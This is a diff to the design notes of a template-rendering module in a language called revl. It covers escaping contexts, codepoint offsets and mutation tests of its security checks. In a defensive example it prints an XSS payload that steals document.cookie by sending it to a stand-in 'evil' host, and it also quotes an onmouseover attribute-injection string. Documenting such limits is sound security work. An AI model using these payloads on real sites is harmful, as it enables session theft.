@@ -86,8 +86,10 @@ landing:
 - **The call is not ambiguous about what it inserts.** A hole with no bound
   value is an `Err` (no empty default), and a name bound twice is an `Err` (no
   scan-order tiebreak), so "which value landed here" is always answerable.
-- **Origin groundwork.** Each `Hole` carries `start`/`end`, the offsets of the
-  whole hole in the template. That is what a later stage needs to map generated
+- **Origin groundwork.** Each `Hole` carries `start`/`end`, the **codepoint**
+  offsets of the whole hole in the template, so `tpl.slice(start, end)` is the
+  hole exactly on every tier (a byte slice would mis-slice every non-ASCII
+  template). That is what a later stage needs to map generated
   output back to an insertion site in the original file.
 - **Pure revl, every tier.** The module is built on the base `Str`/`Int` surface
   plus the three escapers, introduces no externs, and so lowers on every backend
@@ -98,7 +100,7 @@ landing:
 | context | site | escaper | what it stops |
 | --- | --- | --- | --- |
 | `html` | element text, or a quoted attribute value | `escape_html` | tag and attribute breakout (`& < > " '`) |
-| `script` | inside a `<script>` JS string literal | `escape_js` | `</script>` and `<!--` element breakout, quote and line-terminator breakout |
+| `script` | inside a **double-quoted** `<script>` JS string literal | `escape_js` | `</script>` and `<!--` element breakout, double-quote and line-terminator breakout |
 | `uri` | a URL component (`href`, `src`, a query value) | `escape_uri` | component breakout (`/`, `?`, `&`, `#`, `%`, space, and multi-byte bytes) |
 
 `html` and a quoted attribute deliberately share one escaper: the five characters
@@ -127,7 +129,21 @@ author writes `attr="{{html:x}}"`).
   because detecting it is the HTML parse this module refuses to do. What the
   module guarantees is the other half of the property: escaping is never
   optional, and a context outside the closed set is refused rather than
-  defaulted.
+  defaulted. Concretely, the `script` row above is scoped to a **double-quoted**
+  JS string literal, because `escape_js` deliberately leaves the single quote
+  alone (`stdlib/escape.rvl:121-122`). Declaring `script` *correctly* at a
+  **single-quoted** JS literal site therefore still breaks out of it:
+
+  ```revl
+  render_one("<script>const cfg = '{{script:v}}';</script>", "v",
+             "';fetch('//evil/'+document.cookie)//")
+  // -> <script>const cfg = '';fetch('//evil/'+document.cookie)//';</script>
+  ```
+
+  That is live JS injection, not a rendering artifact: the payload closes the
+  literal and runs. Closing it needs a JS-string escaper parameterised by the
+  quoting character, which this stage does not have; until it does, a
+  `{{script:...}}` hole must land in a double-quoted literal.
 - **`Result` for every failure, no `fail`.** A malformed template and an unbound
   hole are ordinary outcomes of rendering data that the program did not author,
   so they travel as values. `Err.code` is a stable token (`malformed-hole`,
@@ -191,3 +207,17 @@ same call against a module whose escaper table returns its argument unchanged
 emits the payload verbatim (an element breakout), and the same escaper at a
 single-quoted attribute site emits `' onmouseover=alert(1) x='` verbatim (an
 attribute injection).
+
+The proof is committed, not described:
+`test_every_neutering_is_caught_by_the_committed_checks` is parametrised over
+sixteen source mutations (the escaper table returning its argument, the context
+gates removed, each escaper replaced by each other escaper), rewrites
+`stdlib/template.rvl` and `stdlib/escape.rvl` into `tmp_path` and recompiles
+from there — so a mutation reaches the layer the checks execute — and fails if
+the security checks do not notice. `test_the_proof_has_a_baseline_the_shipped_module_passes_every_check`
+is the other half: with no mutation every check holds, so "the checks failed" is
+only meaningful evidence against a green baseline. The wrongly-contextual half
+is pinned directly by `test_the_context_choice_is_load_bearing` (using `script`
+at an attribute site is a breakout) and by
+`test_a_wrong_declaration_is_an_author_error_the_module_documents_not_catches`
+(the declaration is intent; the module does not check it against the markup).
